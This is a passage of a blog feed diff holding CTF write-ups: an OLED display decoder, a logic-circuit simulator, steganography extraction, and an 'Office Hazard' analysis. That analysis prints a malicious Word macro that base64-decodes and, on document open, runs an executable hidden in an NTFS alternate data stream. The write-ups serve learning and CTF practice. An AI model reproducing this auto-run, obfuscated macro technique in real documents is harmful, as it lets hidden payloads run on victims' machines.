+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xa8</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Multiplex Ration Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">multiplex_ration_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xd3</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Display Offset Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">display_offset_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="mh">0x40</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0x7f</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set Display start line: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xad</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DC-DC Control Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">dcdc_control_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="mh">0xa0</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xa1</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set segment re-map: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="mh">0xc0</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xc8</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set common output scan direction: </span><span class="si">{</span><span class="n">bits</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xda</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Common Pads Config Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">common_pads_config_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0x81</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Contrast Control Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">contrast_control_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xd9</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Dis/Pre-charge period mode set TODO"</span><span class="p">)</span>
+					<span class="n">dispre_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0xdb</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"VCOM Deselect Mode Set TODO"</span><span class="p">)</span>
+					<span class="n">vcom_deselect_mode_set</span> <span class="o">=</span> <span class="mi">1</span>
+				<span class="k">elif</span> <span class="mh">0x30</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0x33</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set pump voltage value: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="mh">0xa6</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xa7</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set normal/reverse display: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="n">byte</span> <span class="o">==</span> <span class="mh">0x20</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"CSONGI PLS TODO"</span><span class="p">)</span>
+				<span class="k">elif</span> <span class="mh">0xa4</span> <span class="o">&lt;=</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">byte</span> <span class="o">&lt;=</span> <span class="mh">0xa5</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Set entire display ON/OFF: </span><span class="si">{</span><span class="n">byte</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="si">}</span><span class="s"> TODO"</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Unknown command op: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+					<span class="nb">exit</span><span class="p">()</span>
+
+				<span class="k">if</span> <span class="n">lower_set</span> <span class="ow">and</span> <span class="n">upper_set</span><span class="p">:</span>
+					<span class="n">lower_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="n">upper_set</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="c1">#currx = column_addr_high &lt;&lt; 4 | column_addr_low
+</span>					<span class="n">currx</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Set collumn to: </span><span class="si">{</span><span class="n">currx</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+				<span class="k">continue</span>
+			<span class="c1">#data byte for RAM op
+</span>			<span class="k">if</span> <span class="n">dc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+				<span class="n">ram_count</span> <span class="o">+=</span> <span class="mi">1</span>
+				<span class="c1">#print(f"RAM op {bits}")
+</span>				<span class="n">drawn</span> <span class="o">=</span> <span class="bp">True</span>
+				<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
+				<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">bits</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+					<span class="n">display</span><span class="p">[</span><span class="n">currx</span><span class="p">][</span><span class="n">curry</span> <span class="o">+</span> <span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+					<span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
+				<span class="c1">#increment the column
+</span>				<span class="n">currx</span> <span class="o">+=</span> <span class="mi">1</span>
+				<span class="c1"># if we reach the end of the screen, go to next page
+</span>				<span class="k">if</span> <span class="n">currx</span> <span class="o">&gt;</span> <span class="mi">127</span><span class="p">:</span>
+					<span class="n">currx</span> <span class="o">=</span> <span class="mi">0</span>
+					<span class="c1">#increment page modulo 8
+</span>					<span class="n">prev_page_addr</span> <span class="o">=</span> <span class="n">page_addr</span>
+					<span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">page_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
+					<span class="c1">#set y cordinate
+</span>					<span class="n">curry</span> <span class="o">=</span> <span class="n">page_addr</span> <span class="o">*</span> <span class="mi">8</span>
+
+					<span class="k">if</span> <span class="n">prev_page_addr</span> <span class="o">&gt;</span> <span class="n">page_addr</span><span class="p">:</span>
+						<span class="n">newImg</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">img_count</span><span class="p">)</span> <span class="o">+</span> <span class="s">".png"</span><span class="p">,</span> <span class="n">display_width</span><span class="p">,</span><span class="n">display_height</span><span class="p">,</span> <span class="n">display</span><span class="p">)</span>
+						<span class="n">img_count</span> <span class="o">+=</span> <span class="mi">1</span>
+						<span class="n">display</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">display_width</span><span class="p">,</span> <span class="n">display_height</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+
+
+			<span class="k">continue</span>
+</code></pre></div></div>
+
+<p>It was quite buggy, and the “screenshots” I managed to build weren’t necessary correct, but were good enough where they needed to be (probably because Csongi is a good guy, and didn’t wanted to make it any harder).</p>
+
+<p><img src="/media/sc22/hardware/broken/0.png" alt="image" /></p>
+
+<p>I managed to build images like the one above, and scrolling through them, the last two images contained the flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="hardware" /><category term="secchallenge22" /><summary type="html"><![CDATA[Just buy the display and win LUL]]></summary></entry><entry><title type="html">Flagshift</title><link href="https://m4rcix.github.io/sc22/hardware/flagshift" rel="alternate" type="text/html" title="Flagshift" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/hardware/flagshift</id><content type="html" xml:base="https://m4rcix.github.io/sc22/hardware/flagshift"><![CDATA[<h2 id="description">Description</h2>
+
+<p>We found a weird logic circuit called Flagshifter that could theoretically generate new flags. We don’t fully understand it yet, and would take a long time to look through it by hand, so it would be great if you could write a simulation program to see if we can find something interesting in the output.</p>
+
+<ul>
+  <li>Author: gb</li>
+  <li>Attachments: <a href="/media/sc22/hardware/flagshift/challenge.png">challenge.png</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>We are given the following image and the task seems simple: implement the logic, and you get the flag.</p>
+
+<p><img src="/media/sc22/hardware/flagshift/challenge.png" alt="image" /></p>
+
+<p>I chose to implement the logic in <code class="language-plaintext highlighter-rouge">python</code>, and for sake of simple coding, kept everything in binary data form, so I don’t have to convert in the code, just do the conversion once using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">NAND</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+	<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="ow">not</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="n">m</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">OR</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+	<span class="k">return</span> <span class="n">n</span> <span class="o">|</span> <span class="n">m</span>
+
+<span class="k">def</span> <span class="nf">AND</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+	<span class="k">return</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="n">m</span>
+
+<span class="k">def</span> <span class="nf">XOR</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+	<span class="k">return</span> <span class="n">n</span> <span class="o">^</span> <span class="n">m</span>
+
+<span class="n">inp</span> <span class="o">=</span> <span class="s">"10110000101001101110111110000110111010010111010000101100010101001000011011111010101100000011000100010100110000010000001011011000101000010100100101110101011010110010111000101100110010110001111011101011100011100100100010100001010010001111001101100010"</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="s">"11000010111000010000010101001110010011000001100011001001010100111100001001000011100010101110110010111011111110010110101000100010101001110111001100010100100110100000011000011100010101100010101011000100000000110000011001110100011001110111010011100110"</span>
+
+<span class="n">r1</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">r2</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">r3</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">r4</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">r5</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">r6</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">r7</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">r8</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">inp</span><span class="p">)):</span>
+
+	<span class="n">r1o</span> <span class="o">=</span> <span class="n">r1</span>
+	<span class="n">r2o</span> <span class="o">=</span> <span class="n">r2</span>
+	<span class="n">r3o</span> <span class="o">=</span> <span class="n">r3</span>
+	<span class="n">r4o</span> <span class="o">=</span> <span class="n">r4</span>
+	<span class="n">r5o</span> <span class="o">=</span> <span class="n">r5</span>
+	<span class="n">r6o</span> <span class="o">=</span> <span class="n">r6</span>
+	<span class="n">r7o</span> <span class="o">=</span> <span class="n">r7</span>
+	<span class="n">r8o</span> <span class="o">=</span> <span class="n">r8</span>
+
+	<span class="n">r1</span> <span class="o">=</span> <span class="n">AND</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">r4o</span><span class="p">)</span>
+	<span class="n">r2</span> <span class="o">=</span> <span class="n">r1o</span>
+	<span class="n">r3</span> <span class="o">=</span> <span class="n">r2o</span>
+	<span class="n">r4</span> <span class="o">=</span> <span class="n">OR</span><span class="p">(</span><span class="n">r3o</span><span class="p">,</span> <span class="n">NAND</span><span class="p">(</span><span class="n">r1o</span><span class="p">,</span> <span class="n">r6o</span><span class="p">))</span>
+	<span class="n">r5</span> <span class="o">=</span> <span class="n">r4o</span>
+	<span class="n">r6</span> <span class="o">=</span> <span class="n">AND</span><span class="p">(</span><span class="n">r5o</span><span class="p">,</span> <span class="n">r2o</span><span class="p">)</span>
+	<span class="n">r7</span> <span class="o">=</span> <span class="n">r6o</span>
+	<span class="n">r8</span> <span class="o">=</span> <span class="n">r7o</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="n">XOR</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">r8o</span><span class="p">)</span>
+	<span class="n">out</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="hardware" /><category term="secchallenge22" /><summary type="html"><![CDATA[Bit less laborous than the Gates of Valhalla]]></summary></entry><entry><title type="html">G.O.A.T. 🐐</title><link href="https://m4rcix.github.io/sc22/misc/goat" rel="alternate" type="text/html" title="G.O.A.T. 🐐" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/goat</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/goat"><![CDATA[<h2 id="description">Description</h2>
+
+<p>I just found this weird gif-like file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://www.crysys.hu/downloads/misc/movie.apng
+</code></pre></div></div>
+
+<p>Here, take a look for yourself.</p>
+
+<ul>
+  <li>Author: veloxer</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>This is indeed a weird looking file, I haven’t seen this extension before, and I cannot open it with anything, so I started googling. The creator didn’t troll us with the extension, as it is an Animated PNG, hence <code class="language-plaintext highlighter-rouge">apng</code>. The format of these files are quite the same as PNGs, except they contain additional <code class="language-plaintext highlighter-rouge">fcTL</code> and <code class="language-plaintext highlighter-rouge">fdAT</code> chunks. <code class="language-plaintext highlighter-rouge">fcTL</code> chunks are responsible for animating the frames, while <code class="language-plaintext highlighter-rouge">fdAT</code> chunks hold the data, similarly to <code class="language-plaintext highlighter-rouge">IDAT</code> chunks. Looking at the available information online I found a tool called <a href="http://entropymine.com/jason/tweakpng/">TweakPNG</a>. Its quite an ancient one, but with <code class="language-plaintext highlighter-rouge">wine</code> we can run it even on Linux, and it lets us inspect the chunks of our file.</p>
+
+<p>Scanning through the chunks, one chunk in particular stood out, since it had many <code class="language-plaintext highlighter-rouge">fdAT</code> chunks after each other, while the rest of the file followed a nice structure: One <code class="language-plaintext highlighter-rouge">fcTL</code> chunk followed by an <code class="language-plaintext highlighter-rouge">fdAT</code> chunk. Looking into how to disassemble the <code class="language-plaintext highlighter-rouge">APNG</code> into separate <code class="language-plaintext highlighter-rouge">PNGs</code> I’ve found the tool called <code class="language-plaintext highlighter-rouge">apngdis</code>.</p>
+
+<p>Using that tool I split up the original file into many still <code class="language-plaintext highlighter-rouge">png</code> images:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apngdis movie.apng
+</code></pre></div></div>
+<p>Using another tool called <code class="language-plaintext highlighter-rouge">pngcheck</code>, and a bit of python, we can find the file, that has those extra chunks:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">429</span><span class="p">):</span>
+	<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+	<span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'frames/apngframe</span><span class="si">{</span><span class="s">"0"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3</span> <span class="o">-</span> <span class="n">length</span><span class="p">)</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="s">.png'</span>
+	<span class="k">with</span> <span class="n">process</span><span class="p">([</span><span class="s">"pngcheck"</span><span class="p">,</span> <span class="s">"-vf"</span><span class="p">,</span> <span class="n">filename</span><span class="p">],</span> <span class="n">level</span> <span class="o">=</span> <span class="s">"CRITICAL"</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+		<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
+		<span class="n">chunk_count</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'[0-9]* chunks'</span><span class="p">,</span> <span class="n">output</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+		
+		<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">chunk_count</span><span class="si">}</span><span class="s"> chunks'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Indeed, there is a file with much higher chunk count then the others.
+Inspecting that file using <code class="language-plaintext highlighter-rouge">zsteg</code>, we can see, that there is a <code class="language-plaintext highlighter-rouge">jpeg</code> hidden inside our <code class="language-plaintext highlighter-rouge">png</code> file, which we can extract using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zsteg 129.png <span class="nt">-E</span> b1,b,lsb,xy <span class="o">&gt;</span> hidden.jpg
+</code></pre></div></div>
+
+<p><img src="/media/sc22/misc/goat/hidden.jpg" alt="image" /></p>
+
+<p>From here, we can advance further. Checking basic stuff on this JPEG, namely using <code class="language-plaintext highlighter-rouge">strings</code> and <code class="language-plaintext highlighter-rouge">binwalk</code> we can see, that it contains a password, as well as a hidden zip file inside of it. We can extract it using <code class="language-plaintext highlighter-rouge">dd</code> once again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dd if=hidden.jpg of=hidden.zip bs=1 skip=5454
+</code></pre></div></div>
+<p>After unzipping, we get an <code class="language-plaintext highlighter-rouge">mp3</code> file. Playing it we can hear a weird crackling noise. Checking it up in <code class="language-plaintext highlighter-rouge">Audacity</code> we can see a hidden message:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[Speechcraft 100]]></summary></entry><entry><title type="html">Office Hazard</title><link href="https://m4rcix.github.io/sc22/misc/office" rel="alternate" type="text/html" title="Office Hazard" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/office</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/office"><![CDATA[<h2 id="description">Description</h2>
+
+<p>The office is a dangerous place. Last week Pam (the secretary) got an email, containing an archive. She ALMOST opened it, but then she remembered the IT security training from last month and fortunately decided to send the file to you. Somethings was phishy about the sender address to her. It was a close call to say the least…</p>
+
+<p><strong>IMPORTANT NOTES</strong></p>
+
+<ol>
+  <li>This challenge cannot be solved on any file systems other than NTFS.</li>
+  <li>If you want to see the challenge in action, you have to use a Windows box with Office installed. In addition, add the folder where the challenge is extracted to to <code class="language-plaintext highlighter-rouge">Trusted Locations</code> (<a href="https://support.microsoft.com/en-us/office/add-remove-or-change-a-trusted-location-7ee1cdc2-483e-4cbb-bcb3-4e7c67147fb4">help for that</a>). The challenge can be solved without actually running anything.</li>
+  <li>Windows Defender and other AVs might flag the files as dangerous, these are false positive alerts.</li>
+</ol>
+
+<ul>
+  <li>Author: chronos</li>
+  <li>Attachments: <a href="/media/sc22/misc/office/office_hazard.rar">office_hazard.rar</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>I’ve read enough stuff about CTFs and Word documents, to know, that we are looking at a VBA script challenge. Setting up a VM, and opening the Word doc, a totally not sus command prompt is opened. I quickly extracted the VBA script using <a href="https://github.com/decalage2/oletools/wiki/olevba">olevba</a>. Its a not so big script, so thankfully, it isn’t VBA reversing.</p>
+<pre><code class="language-vba">Private Sub Document_Open()
+
+Dim DecodedCode
+DecodedCode = DecodeBase64("Zm9yZmlsZXMgL1AgQzpcV2luZG93c1xTeXN0ZW0zMiAvbSBjYWxjLmV4ZSAvYyAlY2QlXHNlY3JldC50eHQ6aGFjay5leGU=")
+
+CreateObject("WScript.Shell").Exec ("cmd /c " &amp; DecodedCode)
+
+
+End Sub
+
+Function DecodeBase64(b64$)
+    Dim b
+    With CreateObject("Microsoft.XMLDOM").createElement("b64")
+        .DataType = "bin.base64": .Text = b64
+        b = .nodeTypedValue
+        With CreateObject("ADODB.Stream")
+            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
+            DecodeBase64 = .ReadText
+            .Close
+        End With
+    End With
+End Function
+</code></pre>
+
+<p>The code above is run once on opening the document. Decoding the base64 string, we can see, that we are running the following command:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">forfiles</span><span class="w"> </span><span class="nx">/P</span><span class="w"> </span><span class="nx">C:\Windows\System32</span><span class="w"> </span><span class="nx">/m</span><span class="w"> </span><span class="nx">calc.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="o">%</span><span class="nx">cd</span><span class="o">%</span><span class="nx">\secret.txt:hack.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>This basically runs the command forfiles, which is just a magic for running the command defined with the second <code class="language-plaintext highlighter-rouge">/c</code> only once (since <code class="language-plaintext highlighter-rouge">calc.exe</code> is matched once only in the <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code> directory).
+It does some magic with the <code class="language-plaintext highlighter-rouge">secret.txt</code> file. And what is that syntax with the colon? Turns out the reason why <code class="language-plaintext highlighter-rouge">NTFS</code> was requested is <a href="https://www.faqforge.com/windows/use-alternate-datastreams-to-hide-important-files-windows-ntfs/">Alternate Datastreams</a>.
+I wrote a quick few-liner in python to extract the data (I suck at ps, sorry):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'secret.txt:hack.exe'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'hack.exe'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
+        <span class="n">f2</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>All is left for us, to dig the flag out from the <code class="language-plaintext highlighter-rouge">hack.exe</code> binary. Loading the binary into <code class="language-plaintext highlighter-rouge">Ghidra</code> and doing a quick search for “flag” gets the job done:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[Definitely nothing sus here..]]></summary></entry><entry><title type="html">Piecemaker</title><link href="https://m4rcix.github.io/sc22/misc/piecemaker" rel="alternate" type="text/html" title="Piecemaker" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/piecemaker</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/piecemaker"><![CDATA[<h2 id="description">Description</h2>
+
+<p>There is a secret hidden deep in the DC universe. It’s a conspiracy… Or is it?</p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachments: <a href="/media/sc22/misc/piecemaker/piecemaker.tar.gz">piecemaker.tar.gz</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-initial-puzzle">0x1 initial puzzle</h3>
+
+<p>Extracting the files from the given archive, we get tons of puzzle pieces. The task seems simple, put it together. With a bit of python magic, we can remove most of the green background, and put the puzzle pieces together using <code class="language-plaintext highlighter-rouge">GIMP</code> for example.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">import</span> <span class="nn">glob</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">images</span> <span class="o">=</span> <span class="n">glob</span><span class="p">.</span><span class="n">glob</span><span class="p">(</span><span class="s">"../*.jpg"</span><span class="p">)</span>
+
+<span class="n">pr</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Status"</span><span class="p">)</span>
+
+<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">images</span><span class="p">:</span>
+    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">convert</span><span class="p">(</span><span class="s">"RGBA"</span><span class="p">)</span>
+    <span class="n">datas</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">getdata</span><span class="p">()</span>
+
+
+    <span class="n">newData</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">datas</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">240</span> <span class="ow">and</span> <span class="n">item</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
+            <span class="n">newData</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">newData</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
+
+    <span class="n">img</span><span class="p">.</span><span class="n">putdata</span><span class="p">(</span><span class="n">newData</span><span class="p">)</span>
